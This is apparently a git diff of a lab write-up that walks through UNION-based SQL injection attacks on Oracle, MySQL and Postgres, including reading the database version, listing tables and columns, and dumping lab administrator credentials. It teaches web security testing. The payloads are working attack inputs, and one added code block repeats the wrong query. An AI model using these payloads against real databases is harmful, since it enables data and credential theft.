@@ -56,15 +56,15 @@ To solve the lab, follow these steps to find the columns containing strings:
 
 - First, determine the number of columns by injecting `' ORDER BY 1--`. Here, 1 is the column number. Continue increasing until an error occurs, which indicates the correct number of columns. For example, the result indicates there are 2 columns.
   ```sql
-  SELECT * FROM someTable WHERE category = 'Pets' ORDER BY 2--
+  SELECT * FROM someTable WHERE category = 'any' ORDER BY 2--
   ```
 - Next, check which columns contain strings by injecting `' UNION SELECT 'a','a' FROM DUAL--`. Both columns should be string columns.
   ```sql
-  SELECT * FROM someTable WHERE category = 'Pets' UNION SELECT 'a','a' FROM DUAL--
+  SELECT * FROM someTable WHERE category = 'any' UNION SELECT 'a','a' FROM DUAL--
   ```
 - Finally, to obtain the version information, inject `' UNION SELECT 'a', banner FROM v$version--`.
   ```sql
-  SELECT * FROM someTable WHERE category='Pets' UNION SELECT 'a', banner FROM v$version--'
+  SELECT * FROM someTable WHERE category='any' UNION SELECT 'a', banner FROM v$version--'
   ```
 
 # SQL Injection Attack: Querying the Database Type and Version on MySQL and Microsoft
@@ -79,7 +79,7 @@ The main difference is that in MySQL, comments can be started with `#`.
 To query the database version:
 - Inject `' UNION SELECT 'a', @@version#`.
   ```sql
-  SELECT * FROM someTable WHERE category='Pets' UNION SELECT 'a', @@version#'
+  SELECT * FROM someTable WHERE category='any' UNION SELECT 'a', @@version#'
   ```
 
 # SQL Injection Attack: Listing the Database Contents on Oracle
@@ -95,13 +95,36 @@ Steps:
 
 - The [ALL_TAB_COLUMNS](https://docs.oracle.com/en/database/oracle/oracle-database/21/refrn/ALL_TAB_COLUMNS.html#GUID-F218205C-7D76-4A83-8691-BFD2AD372B63) view holds information about the columns of the tables, specifically the `column_name` column. Inject `' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = 'USERS_XJIAWY'--`.
   ```sql
-  SELECT * FROM someTable WHERE category='Pets' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = 'USERS_XJIAWY'--
+  SELECT * FROM someTable WHERE category='any' UNION SELECT column_name, null FROM all_tab_columns WHERE table_name = 'USERS_XJIAWY'--
   ```
   I found the columns `USERNAME_HDFLSL` and `PASSWORD_VASGBS`.
 - Next, use `' UNION SELECT USERNAME_HDFLSL, PASSWORD_VASGBS FROM USERS_XJIAWY--`.
   ```sql
-  SELECT * FROM someTable WHERE category='Pets' UNION SELECT USERNAME_HDFLSL, PASSWORD_VASGBS FROM USERS_XJIAWY--
+  SELECT * FROM someTable WHERE category='any' UNION SELECT USERNAME_HDFLSL, PASSWORD_VASGBS FROM USERS_XJIAWY--
   ```
   I found that the password for the `administrator` is `2ozd1e4np7yp6wc47rx3`.
 
+- The last step is login to solve this lab.
+
+# SQL injection attack, listing the database contents on non-Oracle databases
+## Lab Description
+![image](Picture/lab6.png)
+
+Kiểm tra database thì thấy nó sử dụng `Postgres`, which holds the table information in the `information_schema.tables`.[The relevant documentation](https://www.postgresql.org/docs/9.1/infoschema-tables.html), we can see available columns are listed. So inject `' UNION SELECT table_name,NULL FROM information_schema.tables--` and I found the table `users_xaurai`.
+```sql
+  SELECT * FROM someTable WHERE category='any' UNION SELECT table_name,NULL FROM information_schema.tables--
+```
+
+Steps:
+- `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name = 'users_xaurai'--`
+  ```sql
+  SELECT * FROM someTable WHERE category='any' UNION SELECT table_name,NULL FROM information_schema.tables--
+  ```
+  I found the columns `username_huyzfv` and `password_mxlnvz`.
+- Next step, use `' UNION SELECT username_huyzfv, password_mxlnvz FROM users_xaurai--`.
+  ```sql
+  SELECT * FROM someTable WHERE category='any' UNION SELECT username_huyzfv, password_mxlnvz FROM users_xaurai--
+  ```
+  I found that the password for the `administrator` is `3r5z5qaj2hfhokbicr8a`.
+  
 - The last step is login to solve this lab.
